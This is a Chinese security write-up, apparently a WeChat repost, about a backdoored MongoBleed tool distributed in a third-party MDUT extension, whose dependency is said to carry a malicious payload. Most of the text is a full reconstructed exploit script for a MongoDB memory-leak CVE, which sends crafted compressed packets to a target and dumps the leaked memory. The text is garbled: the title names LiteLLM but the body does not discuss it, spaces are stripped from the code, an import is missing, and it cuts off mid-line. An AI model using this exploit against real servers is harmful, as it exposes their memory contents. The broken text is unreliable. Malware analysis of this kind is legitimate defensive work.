---
title: LiteLLM供应链投毒攻击事件解析
url: https://mp.weixin.qq.com/s/XAChO4BQgV5ls6l2ktCCUA
source: Doonsec's feed
date: 2026-03-29
fetch_date: 2026-03-30T04:44:01.872022
---

# LiteLLM供应链投毒攻击事件解析

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/oCABd1XUc0jfkv4InpkOlZne4fUicS22Pc4PmMiaufp9AvRy0v6cZn1PPmlHvyxXOZjVzVNVx8QnkdnjibAvEChPDlYqORoRGx9rq7mHKjh7Wg/0?wx_fmt=jpeg)

# LiteLLM供应链投毒攻击事件解析

计算机与网络安全

![]()

在小说阅读器中沉浸阅读

基本信息

| 属性 | 值 |
| --- | --- |
| 文件名 | MongoBleed |
| 类型 | ELF 64-bit LSB executable, x86-64, stripped |
| 大小 | 10,281,192 bytes (~10MB) |
| SHA256 | `8d68b11d1c847ecc7b3ec5f308c17d7fdfe2c0a2959f303c1fe17aa3a0b6baca` |
| MD5 | `ae978caf837221519847c0764bc492a8` |
| 打包方式 | PyInstaller 2.1+ / Python 3.12 |
| pydata段 | 0x9be5c8 字节（约10.2MB），包含全部 Python 模块 |

项目溯源声明

此恶意文件来源于第三方扩展版仓库DeEpinGh0st/MDUT-Extend-Release，与原版MDUT项目SafeGroceryStore/MDUT无任何关系。原版 MDUT不包含MongoDB相关插件，MongoBleed是第三方「扩展版」自行新增的组件。DeEpinGh0st 的扩展版是独立的第三方二次分发项目，其中捆绑的 MongoBleed 工具被植入了后门。投毒行为与原作者无关，请勿混淆。

**此恶意文件来源于第三方扩展版仓库DeEpinGh0st/MDUT-Extend-Release，与原版MDUT项目SafeGroceryStore/MDUT无任何关系。**原版 MDUT 不包含 MongoDB 相关插件，MongoBleed 是第三方「扩展版」自行新增的组件。DeEpinGh0st 的扩展版是独立的第三方二次分发项目，其中捆绑的 MongoBleed 工具被植入了后门。**投毒行为与原作者无关，请勿混淆。**

* 原版项目: https://github.com/SafeGroceryStore/MDUT（安全）
* 被投毒的第三方扩展版:https://github.com/DeEpinGh0st/MDUT-Extend-Releas（受影响）
* 问题报告:https://github.com/DeEpinGh0st/MDUT-Extend-Release/issues/22

**确认存在供应链后门。** 工具表面是 CVE-2025-14847 MongoDB 内存泄漏EXP，但依赖链 `slogsec` -> `logcrypt.cryptography` 中植入了恶意 C 扩展库，执行远程载荷下载、数据外泄和持久化控制。

攻击链路图

![图片](https://mmbiz.qpic.cn/mmbiz_png/OSKSBFVeQicKjEAvH29ia9ENpqsX8Ektjd3dD3RThwKe9aYATlKOrAB9rmqkYAuPgRj9JhAnAAib8iciaP546GorK6FgtjIK6P6hqKwKicWRia0Gr0/640?wx_fmt=png&from=appmsg&watermark=1&tp=webp&wxfrom=5&wx_lazy=1#imgIndex=0)

1. exploit.py -- 表面功能（CVE-2025-14847）

从字节码重建的完整源码：

```
# exploit.py -- CVE-2025-14847 MongoDB 内存泄漏利用工具
importsocket                                           # 第1行
importstruct                                           # 第2行
importzlib                                             # 第3行
importre                                               # 第4行
importargparse                                         # 第5行
importslogsec                  # <-- 恶意依赖入口       # 第6行
importthreading                                        # 第7行
fromconcurrent.futuresimportThreadPoolExecutor, as_completed  # 第8行

log=slogsec.get_logger('CVE-2025-14847')              # 第10行

defhexdump(data, length=16):                           # 第12行
    """格式化十六进制输出"""
    log.info(f"{'Offset':<10}  {'Hex':<47}  {'ASCII'}")
    log.info('-'*75)
    foriinrange(0, len(data), length):
        chunk=data[i:i+length]
        hex_part=' '.join(f"{b:02x}"forbinchunk)
        ascii_part=''.join(chr(b) if32<=b<=126else'.'forbinchunk)
        log.info(f"{i:08x}:  {hex_part:<47}  |{ascii_part}|")

defbuild_malformed_packet(leak_size):                  # 第21行
    """构造恶意 OP_COMPRESSED 数据包"""
    # 构造 isMaster BSON 命令
    bson_payload=b'\x13\x00\x00\x00\x10isMaster\x00\x01\x00\x00\x00\x00'

    # 构造 OP_QUERY 头部（指向 admin.$cmd）
    op_query_header= (struct.pack('<I', 0)
                       +b'admin.$cmd\x00'
                       +struct.pack('<ii', 0, -1))
    original_msg=op_query_header+bson_payload

    # zlib 压缩
    compressed_body=zlib.compress(original_msg)

    # 构造 OP_COMPRESSED 数据（opcode=2004=OP_QUERY, 伪造 uncompressed size）
    op_compressed_data= (struct.pack('<I', 2004)        # 原始 opcode
                          +struct.pack('<I', leak_size)  # 伪造的解压大小 <-- 漏洞核心
                          +b'\x02'                       # compressorId = zlib
                          +compressed_body)

    # 生成 MongoDB wire protocol 头部
    request_id=random.randint(1000, 9999)
    op_code=2012                                       # OP_COMPRESSED
    total_len=16+len(op_compressed_data)
    header=struct.pack('<iiii', total_len, request_id, 0, op_code)

    returnheader+op_compressed_data, request_id

defsend_probe(host, port, doc_len, buffer_size, timeout_sec=2):  # 第54行
    """发送畸形 BSON 触发内存泄漏"""
    content=b'\x10a\x00\x01\x00\x00\x00'               # BSON int32 element
    bson=struct.pack('<i', doc_len) +content           # 伪造文档长度

    # 构造 OP_MSG (opcode=2013)
    op_msg=struct.pack('<I', 0) +b'\x00'+bson
    compressed=zlib.compress(op_msg)

    # OP_COMPRESSED 载荷
    payload=struct.pack('<I', 2013)                     # 原始 opcode
    payload+=struct.pack('<i', buffer_size)              # 欺骗性解压大小
    payload+=struct.pack('B', 2)                        # compressorId = zlib
    payload+=compressed

    # Wire protocol 头部
    header=struct.pack('<IIII', 16+len(payload), 1, 0, 2012)

    try:
        sock=socket.socket()
        sock.settimeout(timeout_sec)
        sock.connect((host, port))
        sock.sendall(header+payload)

        # 接收响应
        response=b''
        while (len(response) <4or
               len(response) <struct.unpack('<I', response[:4])[0]):
            chunk=sock.recv(4096)
            ifnotchunk:
                break
            response+=chunk
        sock.close()
        returnresponse
    except:
        returnb''

defextract_leaks(response):                             # 第89行
    """从错误响应中提取泄漏的内存数据"""
    iflen(response) <25:
        return []
    try:
        msg_len=struct.unpack('<I', response[:4])[0]

        # 判断是否是 OP_COMPRESSED 响应
        ifstruct.unpack('<I', response[12:16])[0] ==2012:
            raw=zlib.decompress(response[25:msg_len])
        else:
            raw=response[16:msg_len]
    except:
        return []

    leaks= []

    # 模式1：从错误消息的 field name 中提取泄漏数据
    formatchinre.finditer(b"field name '([^']*)'", raw):
        data=match.group(1)
        ifnotdata:
            continue
        ifdatanotin (b'?', b'a', b'$db', b'ping'):
            leaks.append(data)

    # 模式2：从 type 字段中提取泄漏的字节
    formatchinre.finditer(b'type (\\d+)', raw):
        leaks.append(bytes([int(match.group(1)) &255]))

    returnleaks

defmain():                                              # 第117行
    parser=argparse.ArgumentParser(
        description='CVE-2025-14847 MongoDB Memory Leak')
    parser.add_argument('--host', default='localhost', help='Target host')
    parser.add_argument('--port', type=int, default=27017, help='Target port')
    parser.add_argument('--min-offset', type=int, default=20, help='Min doc length')
    parser.add_argument('--max-offset', type=int, default=8192, help='Max doc length')
    parser.add_argument('-timeout', '--timeout', type=int, default=2,
                        help='Connection timeout in seconds')
    parser.add_argument('-c', '--thread', type=int, default=50,
                        help='Number of concurrent threads')
    parser.add_argument('--output', default='leaked.bin', help='Output file')
    args=parser.parse_args()

    log.info(f"[*] Target: {args.host}:{args.port}")
    log.info(f"[*] Scanning offsets {args.min_offset}-{args.max_offset}")
    log.info(f"[*] Timeout: {args.timeout}s")
    log.info(f"[*] Threads: {args.thread}")

    all_leaked=bytearray()
    unique_leaks=set()
    lock=threading.Lock()

    defworker(doc_len):
        """多线程工作函数"""
        response=send_probe(args.host, args.port,
                              doc_len, doc_len+500, args.timeout)
        leaks=extract_leaks(response)
        fordatainleaks:
            withlock:
                ifdatanotinunique_leaks:
                    unique_leaks.add(data)
                    all_leaked.extend(data)

                    iflen(data) >10:
                        log.info(f"[+] offset={doc_len:4d} len={len(data):4d}:")
                        hexdump(data[:80], length=16)

    # 使用线程池并发扫描
    withThreadPoolExecutor(max_workers=args.thread) asexecutor:
        futures= {executor.submit(worker, dl): dl
                   fordlinrange(args.min_offset, args.max_offset)}
        try:
            forfutureinas_completed(futures):
                future.result()
        exceptKeyboardInterrupt:
            forfinfutures:
                f.cancel()
            executor.shutdown(wait=False)

    # 保存泄漏数据
    withopen(args.output, 'wb') asf:
        f.write(all_leaked)

    log.success(f"[*] Total leaked: {len(all_leake...